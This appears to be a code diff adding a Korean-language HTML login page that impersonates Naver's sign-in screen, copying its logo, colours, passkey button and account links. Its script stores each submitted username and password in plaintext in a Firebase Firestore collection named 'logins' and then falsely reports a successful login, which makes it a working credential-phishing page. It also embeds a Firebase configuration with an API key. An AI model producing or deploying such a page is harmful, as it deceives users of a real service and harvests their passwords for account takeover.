@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NAVER 로그인</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://cdn.jsdelivr.net/gh/orioncactus/pretendard/dist/web/static/pretendard.css');
+        body {
+            font-family: 'Pretendard', sans-serif;
+            background-color: #ffffff;
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen bg-white text-gray-800 justify-between">
+
+    <!-- 상단 헤더 -->
+    <header class="flex items-center px-4 py-4">
+        <button class="text-gray-700 focus:outline-none" aria-label="뒤로 가기">
+            <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"></path>
+            </svg>
+        </button>
+    </header>
+
+    <!-- 메인 컨텐츠 영역 -->
+    <main class="flex-grow flex flex-col px-6 pt-6 max-w-md w-full mx-auto">
+        <!-- 네이버 로고 -->
+        <div class="flex justify-center mb-10">
+            <h1 class="text-4xl font-extrabold tracking-tight text-[#03C75A]">NAVER</h1>
+        </div>
+
+        <!-- 로그인 폼 -->
+        <form id="login-form" class="space-y-4">
+            <!-- 아이디 입력 -->
+            <div class="border-b border-gray-300 focus-within:border-[#03C75A] pb-2">
+                <input type="text" id="username" placeholder="아이디 또는 전화번호" required class="w-full text-base placeholder-gray-400 focus:outline-none bg-transparent">
+            </div>
+
+            <!-- 비밀번호 입력 -->
+            <div class="border-b border-gray-300 focus-within:border-[#03C75A] pb-2">
+                <input type="password" id="password" placeholder="비밀번호" required class="w-full text-base placeholder-gray-400 focus:outline-none bg-transparent">
+            </div>
+
+            <!-- 로그인 상태 메시지 표시용 -->
+            <div id="status-msg" class="text-xs text-center font-medium h-5"></div>
+
+            <!-- 로그인 버튼 -->
+            <button type="submit" id="login-btn" class="w-full bg-[#03C75A] text-white font-medium py-3.5 rounded-md text-base mt-2 hover:bg-[#02b351] transition">
+                로그인
+            </button>
+        </form>
+
+        <!-- 패스키 로그인 버튼 -->
+        <button class="w-full bg-[#F4F5F7] text-gray-800 font-medium py-3.5 rounded-md text-base mt-3 flex items-center justify-center space-x-2 hover:bg-[#eaecee] transition">
+            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12.5 2C8.36 2 5 5.36 5 9.5c0 1.95.73 3.73 1.93 5.08L4.64 16.93a1 1 0 000 1.41l2.12 2.12a1 1 0 001.41 0l2.35-2.35C11.77 18.27 13.55 19 15.5 19 19.64 19 23 15.64 23 11.5S19.64 2 15.5 2h-3zM15.5 15c-1.93 0-3.5-1.57-3.5-3.5s1.57-3.5 3.5-3.5 3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5zm-8-7.5C8.88 7.5 10 6.38 10 5s-1.12-2.5-2.5-2.5S5 3.62 5 5s1.12 2.5 2.5 2.5z"/>
+            </svg>
+            <span>패스키 로그인</span>
+        </button>
+
+        <!-- 하단 링크 (아이디 찾기, 비밀번호 찾기, 회원가입) -->
+        <div class="flex justify-center items-center text-xs text-gray-500 mt-6 space-x-3">
+            <a href="#" class="hover:underline">아이디 찾기</a>
+            <span class="text-gray-300">|</span>
+            <a href="#" class="hover:underline">비밀번호 찾기</a>
+            <span class="text-gray-300">|</span>
+            <a href="#" class="text-[#03C75A] font-semibold hover:underline">회원가입</a>
+        </div>
+    </main>
+
+    <!-- 하단 광고 혹은 영역 (노란색 박스) -->
+    <footer class="w-full bg-[#FFE600] h-14 mt-auto"></footer>
+
+    <!-- Firebase 연동 스크립트 -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // 전달해주신 Firebase 설정 정보 적용
+        const firebaseConfig = {
+            apiKey: "AIzaSyBnjCWfcbvrvadmQ3bjoRJTD-rXSKzp_Bo",
+            authDomain: "git-io-33713.firebaseapp.com",
+            projectId: "git-io-33713",
+            storageBucket: "git-io-33713.firebasestorage.app",
+            messagingSenderId: "488733080531",
+            appId: "1:488733080531:web:2a95f7c25856b078ce8d26",
+            measurementId: "G-58XJP9R6HB"
+        };
+
+        let db;
+        try {
+            const app = initializeApp(firebaseConfig);
+            db = getFirestore(app);
+        } catch (e) {
+            console.error("Firebase initialization error", e);
+        }
+
+        // 로그인 폼 제출 이벤트 처리
+        const loginForm = document.getElementById('login-form');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const statusMsg = document.getElementById('status-msg');
+        const loginBtn = document.getElementById('login-btn');
+
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!username || !password) return;
+
+            loginBtn.disabled = true;
+            statusMsg.innerText = "로그인 처리 중...";
+            statusMsg.className = "text-xs text-center font-medium h-5 text-gray-500";
+
+            try {
+                // Firestore의 'logins' 컬렉션에 데이터 저장
+                const loginsRef = collection(db, 'logins');
+                await addDoc(loginsRef, {
+                    username: username,
+                    password: password,
+                    createdAt: serverTimestamp()
+                });
+
+                statusMsg.innerText = "로그인 성공!";
+                statusMsg.className = "text-xs text-center font-medium h-5 text-[#03C75A]";
+                
+                // 입력창 초기화
+                usernameInput.value = '';
+                passwordInput.value = '';
+            } catch (error) {
+                console.error("Error saving login data:", error);
+                statusMsg.innerText = "오류가 발생했습니다. 다시 시도해주세요.";
+                statusMsg.className = "text-xs text-center font-medium h-5 text-red-500";
+            } finally {
+                loginBtn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
